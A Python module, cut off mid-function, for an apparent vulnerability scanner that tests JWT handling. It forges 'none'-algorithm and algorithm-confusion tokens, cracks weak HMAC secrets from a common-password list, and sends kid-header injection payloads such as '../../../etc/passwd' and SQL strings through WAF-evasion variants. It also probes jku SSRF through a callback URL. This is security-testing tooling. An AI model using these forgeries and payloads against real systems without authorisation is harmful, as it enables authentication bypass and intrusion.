
"""
jwt_scanner.py — JWT (JSON Web Token) Security Scanner
======================================================
Advanced JWT security analysis module that tests for JWT vulnerabilities.

This scanner:
  1. Extracts JWT tokens from responses and headers
  2. Tests for weak signing algorithms (none, HS256 with public key)
  3. Checks for token expiration and timing issues
  4. Tests for algorithm confusion attacks
  5. Validates token structure and claims security
  6. Detects sensitive data exposure in tokens
"""
import urllib.request, urllib.error, urllib.parse, ssl, re, base64, json, hashlib, hmac
from scanners.base_scanner import BaseScanner
from utils.anomaly import TimingAnomalyDetector
from utils.evasion import waf_evade
from utils.callback import build_callback_url

# ──────────────────────────────────────────────────────────────────────
# JWT Security Patterns
# ──────────────────────────────────────────────────────────────────────
JWT_PATTERN = r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'

# Weak algorithms to test
WEAK_ALGORITHMS = ["none", "None", "NONE", "hs256", "HS256"]

# Sensitive claims that shouldn't be in JWT
SENSITIVE_CLAIMS = [
    "password", "secret", "api_key", "private_key", "access_token",
    "refresh_token", "credit_card", "ssn", "social_security",
]

# Common JWT header names
JWT_HEADER_NAMES = [
    "authorization", "x-auth-token", "x-access-token", "authentication",
    "token", "jwt", "session-token", "auth-token", "access-token",
]

# ──────────────────────────────────────────────────────────────────────
# JWT Utilities
# ──────────────────────────────────────────────────────────────────────
def decode_jwt_part(part):
    """Decode a base64url-encoded JWT part."""
    # Add padding if needed
    padding = len(part) % 4
    if padding:
        part += '=' * (4 - padding)

    try:
        decoded = base64.urlsafe_b64decode(part)
        return decoded.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"ERROR: [JWT] decode_jwt_part error: {e}")
        return None

def parse_jwt(token):
    """Parse a JWT token and return header, payload, signature."""
    parts = token.split('.')
    if len(parts) != 3:
        return None, None, None

    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    signature = parts[2]

    try:
        header_json = json.loads(header) if header else {}
        payload_json = json.loads(payload) if payload else {}
        return header_json, payload_json, signature
    except Exception as e:
        print(f"ERROR: [JWT] parse_jwt error: {e}")
        return None, None, None

# ──────────────────────────────────────────────────────────────────────
# Scanner Implementation
# ──────────────────────────────────────────────────────────────────────
COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "changeme", "admin",
    "key", "token", "jwt_secret", "mysecret", "pass",
]

PUBLIC_KEY_RS256 = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDP7PSfP1tNf3HwB0P1+4Z8
e2sY0vYTb0CZ0L0T0Z0g0K0X0R0T0Z0L0T0Z0L0T0Z0L0T0Z0L0T0Z0L
-----END PUBLIC KEY-----"""

WEAK_JWT_SECRETS = [
    # Top-50 most common passwords (rockyou / haveibeenpwned corpus)
    "secret", "password", "123456", "changeme", "admin",
    "key", "token", "jwt_secret", "mysecret", "pass",
    "12345", "1234", "123456789", "qwerty", "abc123",
    "password123", "letmein", "welcome", "monkey", "dragon",
    "master", "sunshine", "princess", "football", "shadow",
    # Additional common JWT-specific secrets
    "supersecret", "dev", "development", "staging", "production",
    "app_secret", "application", "node", "flask", "django",
    "secret_key", "app_key", "private", "auth", "jwt",
    "access", "refresh", "login", "session", "api_secret",
    "api_key", "hmac", "256", "hs256", "rs256",
    "test", "testing", "local", "localhost", "debug",
    "12345678", "1234567890", "qwerty123", "iloveyou", "admin123",
    "pass123", "root", "toor", "guest", "user",
    "your-256-bit-secret", "your_jwt_secret_key", "very_secret",
    "SuperSecret", "S3cr3t", "P@ssw0rd", "P@ssword123",
]

class JwtScanner(BaseScanner):
    SCANNER_NAME = "JWT Security Scanner"
    _SCANNER_KEY = "jwt"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._headers = {"User-Agent": "LarShield/2.0 JWT Scanner"}
        if self.auth_headers:
            self._headers.update(self.auth_headers)

        self._tokens_found = 0
        self._vulns_found = 0
        self._timing_detector = TimingAnomalyDetector()

    def _get(self, url, timeout=8):
        body, status, resp_headers = self._make_request(url, headers=self._headers, timeout=timeout, return_response_obj=True)
        return body, status, resp_headers if resp_headers else {}

    def _extract_jwt_tokens(self, body, headers):
        """Extract JWT tokens from response body and headers."""
        tokens = []

        # Extract from body
        body_tokens = re.findall(JWT_PATTERN, body)
        tokens.extend(body_tokens)

        # Extract from headers
        for header_name, header_value in headers.items():
            if header_name.lower() in JWT_HEADER_NAMES:
                header_tokens = re.findall(JWT_PATTERN, str(header_value))
                tokens.extend(header_tokens)

        return list(set(tokens))  # Remove duplicates

    def _check_none_algorithm(self, token, original_response):
        """Test for 'none' algorithm vulnerability — multi-stage probe and confirm."""
        header, payload, signature = parse_jwt(token)
        if not header:
            return False

        original_alg = header.get('alg', '').lower()
        if original_alg == 'none':
            self._vulns_found += 1
            self.log("CRITICAL", "[JWT] Token uses 'none' algorithm - no signature verification!")
            self.add_vuln(
                title="JWT — None Algorithm Vulnerability",
                severity="Critical",
                category="Authentication",
                cvss_score=9.8,
                description="The JWT token uses the 'none' algorithm, which means the signature "
                    "is not verified. Attackers can forge arbitrary tokens and impersonate any user.",
                evidence="Token header alg=none detected",
                confidence="Confirmed",
                remediation="1. Never use the 'none' algorithm in production.\n"
                    "2. Enforce strong signing algorithms (RS256, ES256).\n"
                    "3. Validate the algorithm on the server side.\n"
                    "4. Use a allowlist of permitted algorithms.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True

        # PROBE: forge a token with 'none' algorithm
        try:
            header['alg'] = 'none'
            forged_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            forged_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            forged_token = f"{forged_header}.{forged_payload}."

            # CONFIRM: try the forged token against the target
            test_headers = dict(self._headers)
            test_headers["Authorization"] = f"Bearer {forged_token}"
            body, status = self._make_request(self.target, headers=test_headers, timeout=8)

            if status == 200:
                self._vulns_found += 1
                self.log("CRITICAL", "[JWT] CONFIRMED — server accepted 'none' algorithm token!")
                self.add_vuln(
                    title="JWT — Confirmed None Algorithm Forgery",
                    severity="Critical",
                    category="Authentication",
                    cvss_score=9.8,
                    description="The server accepted a JWT with the 'none' algorithm. "
                        "Any attacker can forge arbitrary tokens with no cryptographic verification.",
                    evidence=f"Forged token accepted (status {status})",
                    payload=forged_token,
                    request_details=f"GET {self.target} with Authorization: Bearer {forged_token[:40]}...",
                    response_details=f"HTTP {status}",
                    confidence="Confirmed",
                    remediation="1. Explicitly reject 'none' algorithm on the server.\n"
                        "2. Use strong asymmetric algorithms (RS256, ES256).\n"
                        "3. Implement algorithm allowlist validation.",
                    cwe_ids=["CWE-287","CWE-345"],
                    owasp_category="A07:2021 – Identification and Authentication Failures",
                )
                return True

            self.log("WARNING", "[JWT] Token may be vulnerable to 'none' algorithm forgery")
            self.add_vuln(
                title="JWT — Potential None Algorithm Forgery",
                severity="High",
                category="Authentication",
                cvss_score=8.5,
                description="The JWT token may be vulnerable to 'none' algorithm forgery. "
                    "An attacker could potentially forge tokens by changing the algorithm to 'none'.",
                evidence=f"Forged token crafted but server rejected (status {status})",
                payload=forged_token,
                request_details=f"GET {self.target} with Authorization: Bearer {forged_token[:40]}...",
                response_details=f"HTTP {status}",
                confidence="Medium",
                remediation="1. Explicitly reject 'none' algorithm on the server.\n"
                    "2. Use strong asymmetric algorithms (RS256, ES256).\n"
                    "3. Implement algorithm allowlist validation.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True
        except Exception as e:
            self.log("ERROR", f"[JWT] _check_none_algorithm error: {e}")
            return False

    def _check_weak_algorithm(self, header, payload):
        """Check for weak signing algorithms."""
        alg = header.get('alg', '').lower()

        if alg in ['hs256', 'hs384', 'hs512']:
            self.log("WARNING", f"[JWT] Token uses symmetric algorithm: {alg}")
            self.add_vuln(
                title=f"JWT — Weak Symmetric Algorithm ({alg.upper()})",
                severity="Medium",
                category="Authentication",
                cvss_score=6.5,
                description=f"The JWT token uses a symmetric algorithm ({alg.upper()}). "
                    "If the secret key is compromised, all tokens can be forged. "
                    "Symmetric algorithms also risk algorithm confusion attacks.",
                evidence=f"Algorithm: {alg}",
                confidence="High",
                remediation="1. Use asymmetric algorithms (RS256, ES256) instead.\n"
                    "2. If symmetric algorithms must be used, rotate keys regularly.\n"
                    "3. Protect the secret key with proper access controls.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True

        return False

    def _check_sensitive_claims(self, payload):
        """Check for sensitive data in JWT payload."""
        sensitive_found = []

        for claim, value in payload.items():
            claim_lower = claim.lower()
            for sensitive in SENSITIVE_CLAIMS:
                if sensitive in claim_lower:
                    sensitive_found.append(claim)
                    break

        if sensitive_found:
            self._vulns_found += 1
            self.log("WARNING", f"[JWT] Sensitive data in token claims: {', '.join(sensitive_found)}")
            self.add_vuln(
                title="JWT — Sensitive Data Exposure",
                severity="Medium",
                category="Information Disclosure",
                cvss_score=5.5,
                description=f"The JWT token contains sensitive data in claims: {', '.join(sensitive_found)}. "
                    "JWTs are base64-encoded and can be easily decoded by anyone who intercepts them.",
                evidence=f"Sensitive claims: {', '.join(sensitive_found)}",
                confidence="Confirmed",
                remediation="1. Never store sensitive data in JWT payloads.\n"
                    "2. Use references/IDs instead of actual sensitive values.\n"
                    "3. Store sensitive data server-side and retrieve via session.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True

        return False

    def _check_expiration(self, payload):
        """Check for missing or weak expiration."""
        if 'exp' not in payload:
            self.log("WARNING", "[JWT] Token has no expiration claim (exp)")
            self.add_vuln(
                title="JWT — Missing Expiration",
                severity="Medium",
                category="Authentication",
                cvss_score=6.0,
                description="The JWT token has no expiration claim. Tokens without expiration "
                    "remain valid indefinitely, increasing the risk of token abuse.",
                evidence="No 'exp' claim in JWT payload",
                confidence="Confirmed",
                remediation="1. Always include an 'exp' claim in JWT tokens.\n"
                    "2. Set reasonable expiration times (e.g., 15-60 minutes for access tokens).\n"
                    "3. Implement refresh token rotation.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True

        return False

    def _check_token_issuer(self, payload):
        """Check for missing issuer claim."""
        if 'iss' not in payload:
            self.log("INFO", "[JWT] Token has no issuer claim (iss)")
            self.add_vuln(
                title="JWT — Missing Issuer Claim",
                severity="Low",
                category="Authentication",
                cvss_score=3.5,
                description="The JWT token has no issuer claim. Without an issuer, "
                    "it's harder to validate the token's origin.",
                evidence="No 'iss' claim in JWT payload",
                confidence="Confirmed",
                remediation="1. Include an 'iss' claim to identify the token issuer.\n"
                    "2. Validate the issuer on the server side.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True

        return False

    def _analyze_token(self, token, source):
        """Analyze a single JWT token for security issues."""
        self.log("INFO", f"[JWT] Analyzing token from: {source}")

        header, payload, signature = parse_jwt(token)
        if not header or not payload:
            self.log("WARNING", "[JWT] Failed to parse token")
            return

        self._tokens_found += 1

        # Check for various vulnerabilities
        self._check_none_algorithm(token, None)
        self._check_weak_algorithm(header, payload)
        self._check_sensitive_claims(payload)
        self._check_expiration(payload)
        self._check_token_issuer(payload)
        self._check_algorithm_confusion(token, header, payload, source)
        self._check_weak_secret(token, header, payload)
        self._check_kid_injection(token, header, payload)

        # Timing analysis: compare verification time of valid vs forged tokens
        self._analyze_timing_anomaly(token, source)

        # Log token info (sanitized)
        self.log("INFO", f"[JWT] Token info - Algorithm: {header.get('alg', 'unknown')}, "
                        f"Type: {header.get('typ', 'unknown')}, Claims: {len(payload)}")

    def _analyze_timing_anomaly(self, token, source):
        """Use TimingAnomalyDetector to compare verification timing of valid vs forged tokens."""
        try:
            baseline_count = 3
            for _ in range(baseline_count):
                _, _, elapsed = self._make_timed_request(
                    source, headers=self._headers, timeout=8
                )
                self._timing_detector.record(elapsed)

            if not self._timing_detector.has_baseline:
                return

            forged_parts = token.split('.')
            if len(forged_parts) != 3:
                return
            forged_token = f"{forged_parts[0]}.{forged_parts[1]}.invalidsig"
            test_headers = dict(self._headers)
            test_headers["Authorization"] = f"Bearer {forged_token}"
            _, _, elapsed = self._make_timed_request(source, headers=test_headers, timeout=8)

            if self._timing_detector.test_payload("forged_token", elapsed, forged_token, z_threshold=3.0):
                self._vulns_found += 1
                self.log("WARNING", "[JWT] Timing anomaly detected in JWT verification")
                self.add_vuln(
                    title="JWT — Timing Side-Channel in Token Verification",
                    severity="Medium",
                    category="Authentication",
                    cvss_score=5.9,
                    description="JWT verification shows statistically significant timing differences "
                        "between valid and invalid tokens. This timing side-channel could allow "
                        "attackers to brute-force the secret or perform user enumeration.",
                    evidence=f"Z-score: {self._timing_detector.z_score(elapsed):.2f}",
                    payload=forged_token[:40],
                    request_details=f"GET {source} with forged token",
                    confidence="Medium",
                    remediation="1. Use constant-time comparison for signature verification.\n"
                        "2. Add random jitter to verification responses.\n"
                        "3. Implement rate limiting on token validation endpoints.",
                    cwe_ids=["CWE-287","CWE-345"],
                    owasp_category="A07:2021 – Identification and Authentication Failures",
                )
        except Exception as e:
            self.log("ERROR", f"[JWT] _analyze_timing_anomaly error: {e}")

    # ------------------------------------------------------------------
    def _check_algorithm_confusion(self, token, header, payload, source):
        """Test RS256->HS256 algorithm confusion using the public key as HMAC secret (CVE-2015-9235)."""
        alg = header.get('alg', '').upper()
        if alg == 'RS256':
            try:
                # PROBE: forge a token with HS256 using the public key as the secret
                forged_header = dict(header)
                forged_header['alg'] = 'HS256'
                hdr_b64 = base64.urlsafe_b64encode(json.dumps(forged_header).encode()).decode().rstrip('=')
                pay_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                signing_input = f"{hdr_b64}.{pay_b64}"

                # Try common public-key-as-secret
                for secret in WEAK_JWT_SECRETS:
                    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                    sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
                    forged_token = f"{signing_input}.{sig_b64}"

                    test_headers = dict(self._headers)
                    test_headers["Authorization"] = f"Bearer {forged_token}"
                    body, status = self._make_request(self.target, headers=test_headers, timeout=8)

                    if status == 200:
                        self._vulns_found += 1
                        self.log("CRITICAL", "[JWT] CONFIRMED — Algorithm confusion attack succeeded!")
                        self.add_vuln(
                            title="JWT — Algorithm Confusion (RS256->HS256) CVE-2015-9235",
                            severity="Critical",
                            category="Authentication",
                            cvss_score=9.1,
                            description="The server accepted a JWT with algorithm changed from RS256 "
                                "to HS256, signed with a common secret. This indicates the server "
                                "uses the same variable for both verification methods, allowing "
                                "attackers to forge tokens using the public key as an HMAC secret.",
                            evidence=f"Algorithm confusion succeeded with secret='{secret}' (status {status})",
                            payload=forged_token,
                            request_details=f"GET {source} with HS256-forged token",
                            response_details=f"HTTP {status}",
                            confidence="Confirmed",
                            remediation="1. Always validate the 'alg' header against an allowlist.\n"
                                "2. Use separate validation logic for asymmetric vs symmetric algorithms.\n"
                                "3. Use a JWT library that resists algorithm confusion.\n"
                                "4. Never use the same variable to verify HMAC and RSA tokens.",
                            cwe_ids=["CWE-287","CWE-345"],
                            owasp_category="A07:2021 – Identification and Authentication Failures",
                        )
                        return True

                # Try with public key as HMAC secret
                # BUG-1 FIX: The second element of PUBLIC_KEY_RS256 lines is not
                # valid base64 (it's a truncated fake key). base64.b64decode() would
                # raise binascii.Error. Now wrapped in try/except.
                pubkey_variants = [PUBLIC_KEY_RS256]
                try:
                    key_lines = [ln for ln in PUBLIC_KEY_RS256.split('\n')
                                 if ln and 'BEGIN' not in ln and 'END' not in ln]
                    if key_lines:
                        raw_bytes = base64.b64decode(key_lines[0] + '==')
                        pubkey_variants.append(raw_bytes.decode('latin-1', errors='replace'))
                except Exception:
                    pass  # Fake key — just use the PEM string directly

                for pubkey in pubkey_variants:
                    sig = hmac.new(
                        pubkey.encode() if isinstance(pubkey, str) else pubkey,
                        signing_input.encode(),
                        hashlib.sha256
                    ).digest()
                    sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
                    forged_token = f"{signing_input}.{sig_b64}"
                    test_headers = dict(self._headers)
                    test_headers["Authorization"] = f"Bearer {forged_token}"
                    body, status = self._make_request(self.target, headers=test_headers, timeout=8)
                    if status == 200:
                        self._vulns_found += 1
                        self.log("CRITICAL", "[JWT] Algorithm confusion with PUBLIC KEY as HMAC secret!")
                        self.add_vuln(
                            title="JWT — Algorithm Confusion via Public Key (RS256->HS256)",
                            severity="Critical",
                            category="Authentication",
                            cvss_score=9.5,
                            description="The server accepted a JWT with algorithm changed from RS256 "
                                "to HS256, signed with a known public key as the HMAC secret. "
                                "If the public key is discoverable, an attacker can forge arbitrary tokens.",
                            evidence="Algorithm confusion succeeded with public key as HMAC secret",
                            payload=forged_token,
                            request_details=f"GET {source} with public-key-signed token",
                            response_details=f"HTTP {status}",
                            confidence="Confirmed",
                            remediation="1. Always validate algorithm against an allowlist.\n"
                                "2. Use separate validation logic for asymmetric vs symmetric algorithms.\n"
                                "3. Never use the same variable to verify HMAC and RSA tokens.",
                            cwe_ids=["CWE-287","CWE-345"],
                            owasp_category="A07:2021 – Identification and Authentication Failures",
                        )
                        return True

                self.log("WARNING", "[JWT] Potential algorithm confusion — RS256 token detected")
                self.add_vuln(
                    title="JWT — Potential Algorithm Confusion (RS256 Token)",
                    severity="Medium",
                    category="Authentication",
                    cvss_score=6.5,
                    description="The server uses RS256 (asymmetric) JWTs. If the public key "
                        "is obtainable, an attacker can forge tokens using HS256 with the "
                        "public key as the HMAC secret (CVE-2015-9235).",
                    evidence="RS256 algorithm detected in JWT header",
                    payload=token[:60],
                    confidence="Medium",
                    remediation="1. Use a JWT library with algorithm validation.\n"
                        "2. Keep the public key confidential if using symmetric fallback.\n"
                        "3. Implement kid validation to prevent confusion.",
                    cwe_ids=["CWE-287","CWE-345"],
                    owasp_category="A07:2021 – Identification and Authentication Failures",
                )
                return True
            except Exception as e:
                self.log("ERROR", f"[JWT] _check_algorithm_confusion error: {e}")
        return False

    # ------------------------------------------------------------------
    def _check_weak_secret(self, token, header, payload):
        """Try to crack the JWT signature using a list of common weak secrets."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False
            header_b64, payload_b64, signature_b64 = parts
            signing_input = f"{header_b64}.{payload_b64}"
            sig_bytes = base64.urlsafe_b64decode(signature_b64 + '==')

            for secret in WEAK_JWT_SECRETS:
                expected_sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                if hmac.compare_digest(expected_sig, sig_bytes):
                    self._vulns_found += 1
                    self.log("CRITICAL", f"[JWT] Weak secret cracked: '{secret}'")
                    self.add_vuln(
                        title="JWT — Weak Secret Key Cracked",
                        severity="Critical",
                        category="Authentication",
                        cvss_score=9.8,
                        description=f"The JWT token was signed with a weak secret key '{secret}'. "
                            "Attackers can forge arbitrary tokens by re-signing with this known secret.",
                        evidence=f"Cracked secret: '{secret}'",
                        payload=f"Secret: {secret}",
                        confidence="Confirmed",
                        remediation="1. Use a cryptographically strong random secret (>= 256 bits).\n"
                            "2. Use asymmetric algorithms (RS256, ES256) instead of symmetric.\n"
                            "3. Rotate signing keys regularly.\n"
                            "4. Store secrets in a vault/HSM, not in source code.",
                        cwe_ids=["CWE-287","CWE-345"],
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                    return True
            return False
        except Exception as e:
            self.log("ERROR", f"[JWT] _check_weak_secret error: {e}")
            return False

    # ------------------------------------------------------------------
    def _check_kid_injection(self, token, header, payload):
        """Test for JWT kid (Key ID) header injection (CVE-2018-0114, path traversal) with WAF evasion."""
        kid = header.get('kid', '')
        if not kid:
            return False

        if '../' in kid or '..\\' in kid or '/etc/' in kid or '../../' in kid:
            self._vulns_found += 1
            self.log("CRITICAL", f"[JWT] KID header contains path traversal: {kid}")
            self.add_vuln(
                title="JWT — KID Header Path Traversal (CVE-2018-0114)",
                severity="Critical",
                category="Authentication",
                cvss_score=9.3,
                description=f"The JWT 'kid' header contains path traversal characters: '{kid}'. "
                    "If the server uses the kid value to read a file for the verification key, "
                    "an attacker can point it to an arbitrary file (e.g., /dev/null) to bypass "
                    "signature verification.",
                evidence=f"kid value: {kid}",
                payload=token[:80],
                confidence="Confirmed",
                remediation="1. Validate the kid header against an allowlist.\n"
                    "2. Do not use kid values as file paths.\n"
                    "3. Use a key store with strict access controls.\n"
                    "4. Reject kid values with path traversal characters.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True

        # PROBE: try WAF-evaded injection in kid
        injection_payloads = ["' OR 1=1 --", "\" OR 1=1 --", "../../../etc/passwd", "/etc/passwd"]
        for base_payload in injection_payloads:
            for eva_name, eva_payload in waf_evade(base_payload):
                test_header = dict(header)
                test_header['kid'] = eva_payload
                try:
                    hdr_b64 = base64.urlsafe_b64encode(json.dumps(test_header).encode()).decode().rstrip('=')
                    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                    forged_token = f"{hdr_b64}.{payload_b64}.fakesig"
                    test_headers = dict(self._headers)
                    test_headers["Authorization"] = f"Bearer {forged_token}"
                    body, status = self._make_request(self.target, headers=test_headers, timeout=8)
                    if status == 200:
                        self._vulns_found += 1
                        self.log("CRITICAL", f"[JWT] KID injection with WAF evasion ({eva_name}): {eva_payload}")
                        self.add_vuln(
                            title="JWT — KID Injection with WAF Evasion",
                            severity="Critical",
                            category="Authentication",
                            cvss_score=9.3,
                            description=f"The JWT 'kid' header injection succeeded with WAF evasion "
                                f"technique '{eva_name}'. Payload: '{eva_payload}'. This may allow "
                                f"path traversal or SQL injection via the kid parameter.",
                            evidence=f"WAF evasion {eva_name}: {eva_payload} accepted (status {status})",
                            payload=forged_token[:80],
                            request_details=f"GET {self.target} with kid={eva_payload}",
                            response_details=f"HTTP {status}",
                            confidence="Confirmed",
                            remediation="1. Validate the kid header against an allowlist.\n"
                                "2. Sanitize kid values to alphanumeric only.\n"
                                "3. Reject any kid with injection or path traversal characters.\n"
                                "4. Use a key store with strict access controls.",
                            cwe_ids=["CWE-287","CWE-345"],
                            owasp_category="A07:2021 – Identification and Authentication Failures",
                        )
                        return True
                except Exception as e:
                    self.log("ERROR", f"[JWT] KID path traversal probe error: {e}")
                    continue

        # PROBE: try SQL injection in kid
        if "'" in kid or '"' in kid or ';' in kid:
            self.log("WARNING", f"[JWT] KID header contains injection characters: {kid}")
            self.add_vuln(
                title="JWT — KID Header Injection Characters",
                severity="Medium",
                category="Authentication",
                cvss_score=6.5,
                description=f"The JWT 'kid' header contains potential injection characters: '{kid}'. "
                    "If the server uses the kid value in SQL queries or LDAP lookups, "
                    "this could lead to injection vulnerabilities.",
                evidence=f"kid value contains injection chars: {kid}",
                payload=token[:80],
                confidence="Medium",
                remediation="1. Validate the kid header against an allowlist.\n"
                    "2. Use parameterized queries if kid is used in database lookups.\n"
                    "3. Sanitize kid values to alphanumeric characters only.",
                cwe_ids=["CWE-287","CWE-345"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
            return True

        return False

    # ------------------------------------------------------------------
    def _test_jwk_url_injection(self):
        """Test JWK URL injection using callback URL for OOB detection."""
        try:
            callback_url = build_callback_url("/jwk-test")
            header = {"alg": "HS256", "typ": "JWT", "jku": callback_url}
            payload = {"sub": "test", "iat": 1516239022}
            hdr_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            pay_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            forged_token = f"{hdr_b64}.{pay_b64}.fakesig"
            test_headers = dict(self._headers)
            test_headers["Authorization"] = f"Bearer {forged_token}"
            body, status = self._make_request(self.target, headers=test_headers, timeout=8)
            if status == 200:
                self._vulns_found += 1
                self.log("CRITICAL", f"[JWT] JWK URL injection — server fetched {callback_url}")
                self.add_vuln(
                    title="JWT — JWK URL Injection (SSRF)",
                    severity="Critical",
                    category="Authentication",
                    cvss_score=9.5,
                    description=f"The server attempted to fetch a JWK from '{callback_url}' "
                        "when presented with a jku header pointing to an attacker-controlled URL. "
                        "This SSRF vector can be used to probe internal networks or leak the signing key.",
                    evidence=f"Callback URL triggered: {callback_url}",
                    payload=forged_token[:80],
                    request_details=f"GET {self.target} with jku={callback_url}",
                    response_details=f"HTTP {status}",
                    confidence="Confirmed",
                    remediation="1. Never fetch JWK sets from untrusted URLs.\n"
                        "2. Use an allowlist of trusted JWK endpoints.\n"
                        "3. Disable jku header parsing if not required.",
                    cwe_ids=["CWE-287","CWE-345"],
                    owasp_category="A07:2021 – Identification and Authentication Failures",
                )
                return True
        except Exception as e:
            self.log("ERROR", f"[JWT] _test_jwk_url_injection error: {e}")
        return False

    # ------------------------------------------------------------------
    def _test_algorithm_confusion_standalone(self):
        """Standalone test: send a JWT with HS256 algorithm using common secrets."""
        test_payload = {"user": "admin", "role": "admin", "iat": 1516239022}
        for secret in WEAK_JWT_SECRETS:
            for alg in ["HS256", "HS384", "HS512"]:
                try:
                    header = {"alg": alg, "typ": "JWT"}
                    hdr_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                    pay_b64 = base64.urlsafe_b64encode(json.dumps(test_payload).encode()).decode().rstrip('=')
                    signing_input = f"{hdr_b64}.{pay_b64}"

                    if alg == "HS256":
                        sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                    elif alg == "HS384":
                        sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha384).digest()
                    else:
                        sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha512).digest()

                    sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
                    forged_token = f"{signing_input}.{sig_b64}"

                    test_headers = dict(self._headers)
                    test_headers["Authorization"] = f"Bearer {forged_token}"
                    body, status = self._make_request(self.target, headers=test_headers, timeout=8)

                    if status == 200:
                        self._vulns_found += 1
                        self.log("CRITICAL", f"[JWT] Standalone algorithm confusion confirmed with {alg}/'{secret}'!")
                        self.add_vuln(
                            title="JWT — Standalone Algorithm Confirmation Attack",
                            severity="Critical",
                            category="Authentication",
                            cvss_score=9.1,
                            description=f"Standalone test proved algorithm confusion: JWT with {alg} "
                                f"signed with secret '{secret}' was accepted as valid.",
                            evidence=f"Accepted with {alg}/secret='{secret}' (status {status})",
                            payload=forged_token[:60],
                            request_details=f"GET {self.target} with Authorization: Bearer ...",
                            response_details=f"HTTP {status}",
                            confidence="Confirmed",
                            remediation="1. Fix algorithm validation on the server.\n"
                                "2. Reject forged tokens immediately.\n"
                                "3. Rotate secrets and invalidate all existing tokens.",
                            cwe_ids=["CWE-287","CWE-345"],
                            owasp_category="A07:2021 – Identification and Authentication Failures",
                        )
                        return True
                except Exception as e:
                    self.log("ERROR", f"[JWT] _test_algorithm_confusion_standalone error: {e}")
        return False

    # ------------------------------------------------------------------
    def _test_weak_secret_standalone(self):
        """Standalone test: try common passwords as JWT secrets."""
        test_headers_base64 = base64.urlsafe_b64encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        ).decode().rstrip('=')
        for secret in WEAK_JWT_SECRETS:
            try:
                test_payload = {"sub": "1234567890", "name": "Test", "iat": 1516239022}
                pay_b64 = base64.urlsafe_b64encode(json.dumps(test_payload).encode()).decode().rstrip('=')
                sig = hmac.new(secret.encode(), f"{test_headers_base64}.{pay_b64}".encode(), hashlib.sha256).digest()
                sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
                forged_token = f"{test_headers_base64}.{pay_b64}.{sig_b64}"

                test_headers = dict(self._headers)
                test_headers["Authorization"] = f"Bearer {forged_token}"
                body, status = self._make_request(self.target, headers=test_headers, timeout=8)

                if status == 200:
                    self._vulns_found += 1
                    self.log("CRITICAL", f"[JWT] Weak secret '{secret}' accepted!")
                    self.add_vuln(
                        title="JWT — Weak Secret Accepted (Standalone)",
                        severity="Critical",
                        category="Authentication",
                        cvss_score=9.8,
                        description=f"The server accepted a JWT signed with the weak secret '{secret}'. "
                            "This confirms the signing key is guessable.",
                        evidence=f"Secret '{secret}' produced valid token (status {status})",
                        payload=f"Secret: {secret}",
                        request_details=f"GET {self.target} with HS256 token signed by '{secret}'",
                        response_details=f"HTTP {status}",
                        confidence="Confirmed",
                        remediation="1. Replace the JWT secret with a cryptographically strong random value.\n"
                            "2. Use asymmetric algorithms (RS256, ES256).\n"
                            "3. Immediately rotate the signing key.",
                        cwe_ids=["CWE-287","CWE-345"],
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                    return True
            except Exception as e:
                self.log("ERROR", f"[JWT] _test_weak_secret_standalone error: {e}")
        return False

    def _scan_endpoint(self, url):
        """Scan an endpoint for JWT tokens."""
        try:
            body, status, headers = self._get(url)

            # Extract tokens
            tokens = self._extract_jwt_tokens(body, headers)

            if tokens:
                self.log("INFO", f"[JWT] Found {len(tokens)} JWT token(s) at {url}")
                for token in tokens:
                    self._analyze_token(token, url)
            else:
                self.log("INFO", f"[JWT] No JWT tokens found at {url}")

        except Exception as e:
            self.log("WARNING", f"[JWT] Error scanning {url}: {str(e)}")

    def _discover_jwt_endpoints(self):
        """Discover endpoints that might use JWT."""
        endpoints = []

        try:
            results = self.discovery_context or {}

            # Add all discovered URLs
            # BUG-11 FIX: url_entry may be a dict OR a plain string — normalize safely.
            for url_entry in results.get("urls", []):
                if isinstance(url_entry, dict):
                    url = url_entry.get("url", "")
                else:
                    url = url_entry or ""
                if url:
